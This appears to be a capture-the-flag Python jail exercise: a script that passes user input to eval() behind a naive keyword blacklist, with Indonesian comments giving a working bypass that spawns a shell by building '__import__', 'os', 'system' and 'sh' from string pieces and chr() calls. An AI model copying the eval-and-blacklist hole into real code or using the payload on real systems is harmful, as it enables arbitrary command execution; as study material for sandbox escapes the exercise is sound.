expr = input("Put syntax to get shell: \n; ")
blacklist = ['__import__', '__system__', 'sh', 'os', "'"]

for char in blacklist:
    if char in expr:
        print(f"U cant use \"{char}\"")
        exit()
eval(expr)

# default syntax untuk mendapatkan shell seperti dibawah ini
# __builtins__.__getattribute__('__imp'+'ort__')('o'+'s').__getattribute__('sys'+'tem')('s'+'h')

# solusi
# mengubah syntax yang menggunakan string diubah menjadi chr()+chr(), contoh __import__
# __builtins__.__getattribute__('__imp'+'ort__')('o'+'s').__getattribute__('sys'+'tem')('s'+'h') MENJADI __builtins__.__getattribute__(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95))(chr(111)+chr(115)).__getattribute__(chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109))(chr(115)+chr(104))